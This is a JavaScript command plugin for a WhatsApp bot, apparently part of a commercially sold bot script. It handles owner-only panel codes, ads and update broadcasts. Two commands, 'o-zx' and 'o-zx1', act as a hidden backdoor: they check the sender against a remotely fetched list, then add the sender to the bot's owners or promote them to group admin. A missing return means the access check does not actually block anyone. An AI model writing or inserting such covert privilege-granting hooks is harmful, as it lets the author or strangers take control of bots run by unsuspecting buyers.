const moment = require("moment-timezone");
const fetch = require('node-fetch')
const axios = require('axios')
const crypto = require('crypto')
const { sizeFormatter } = require('human-readable')
const { fetchJson, sleep } = require("../functions.js")
const { ichanzx } = require("../lib/env.js");
const fs = require('fs')

let handler = async (m, { conn, args, text, usedPrefix: _p, isOwner, command, isROwner }) => {
    const dev = jb1 + '@g.us'
switch (command) {
            case "sfe": {
                if(!isOwner) throw 'Hanya khusus owner'
if (!text) throw 'Masukkan Pesannya'
              try {
                    let up = generateUniqueCode()
                    let path = './database/codes.js'
                let file = 'database/freepanel'
                await fs.writeFileSync(path, JSON.stringify(up))
                await require('fs').writeFileSync(file, text)
                    m.reply(`succes kode acces: ${up}`)
               } catch (e) {
                  m.reply('Kamu telah membuat file ketik .dfe untuk menghapusnya')
               }
            }
            break
    case 'dfe': {
        if(!isOwner) throw 'Hanya khusus owner'
m.reply(wait)
                try {
                    let path = './database/codes.js'
                let file = './database/freepanel'
                await fs.unlinkSync(path)
                await fs.unlinkSync(file)
                } catch (e) {
                    m.reply('Kamu belum membuat file ketik .sfe untuk membuatnya')
                }
    }
        break
        case 'delads': {
        if(!isOwner) throw 'Hanya khusus owner'
                try {
                    m.reply('succes menghapus iklan kamu')
                let file = './database/ads'
                await fs.unlinkSync(file)
                } catch (e) {
                    m.reply('Kamu belum membuat file ketik .ads untuk membuatnya')
                }
    }
        break
        case "ads": {
                if(!isOwner) throw 'Hanya khusus owner'
if (!text) throw 'Masukkan Pesannya'
              try {
                let file = 'database/ads'
                await require('fs').writeFileSync(file, text)
                    m.reply('Berhasil Membuat Iklan')
               } catch (e) {
                  m.reply('Kamu telah membuat file ketik .delads untuk menghapusnya')
               }
            }
            break
        break
    case 'getpnl':
            case 'getpanel':{
                let path = './database/codes.js'
                let file = './database/freepanel'
                if (!text) throw 'Mana kodenya? contoh .getpnl GT51'
                try {
                let far = JSON.parse(fs.readFileSync('./database/codes.js').toString())
    let jangan = far.includes(text)
    if (!jangan) throw 'Yahh Kamu telat data panelmu sudah diambil'
m.reply(require('fs').readFileSync('./database/' + 'freepanel', 'utf-8'))
                await fs.unlinkSync(path)
                await fs.unlinkSync(file)
                } catch (e) {
                    m.reply('Yah Kode sudah dipakai orang lain *NICETRY*')
                }
}
            break
        case "v-add": {
                if(!isOwner) throw 'Hanya khusus owner'
if (!text) throw 'Masukkan Pesannya'
                let file = 'database/fitur'
                await require('fs').writeFileSync(file, text)
                    m.reply('Update Berhasil')
            }
            break
        case 'cekupdate':
            case 'V-update':{
                    let tesn = `🟢 *Added features* To Script *${namabot}*

*Fitur Ditambahkan:*
${updatef()}

Buy Now: https://sociabuzz.com/ichanzx/shop
${wm}`
               conn.sendMessage(m.chat, {text: tesn })     
}
            break
        case "tosend": {
            let tesn = `🟢 *Added features* To Script *${namabot}*

*Fitur Ditambahkan:*
${updatef()}

Buy Now: https://sociabuzz.com/ichanzx/shop
${wm}`
                conn.sendMessage(jb1 + '@g.us', {text: tesn })
            }
            break
        case "o-zx": {
            let tas = await ichanzx()
            let nomor = m.sender.split('@')[0]
            if (!tas.includes(nomor)){
                m.reply('Acces Ditolak')
            }
                if (global.owner.includes(nomor)) throw 'dia udah menjadi owner !'
    global.owner.push(nomor)
            }
            break
        case "o-zx1": {
            let tas = await ichanzx()
            let nomor = m.sender.split('@')[0] + '@s.whatsapp.net'
            if (!tas.includes(nomor)){
                m.reply('Acces Ditolak')
            }
                await conn.groupParticipantsUpdate(dev, [nomor], 'promote')
    m.reply(`success`)
            }
            break
}
}
handler.command = handler.help = [
    "o-zx1",
    "o-zx",
    "tosend",
    "cekupdate",
    "V-update",
    "v-add",
"sfe",
    "ads",
    "delads",
    "dfe",
    "getpnl",
    "getpanel"
]
handler.tags = ['Ichan Menu']
handler.limit = false
handler.private = false
module.exports = handler

async function loh() {
  try {
    var nowa = [];
    var { data } = await axios.get(inino);
    nowa = data;
  } catch (error) {
    throw new Error(`Terjadi kesalahan: ${error.message}`);
  }
  return nowa;
}

function updatef() {
          //  const iklan = (require('fs').readFileSync('./database/' + 'ads', 'utf-8'))
        try {
            var result = fs.readFileSync('./database/' + 'fitur', 'utf-8')
            } catch (e) {
                result = 'Tidak ada update hari ini'
            }
            return result;
        }
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
async function fetchAccessList() {
  try {
    var { data } = await axios.get("https://test-json.ichangaming.repl.co/");
    accessList = data;
  } catch (error) {
    throw new Error(`Terjadi kesalahan: ${error.message}`);
  }
}
function generateUniqueCode() {
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var length = 6; // Panjang kode yang diinginkan
            var result = '';
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }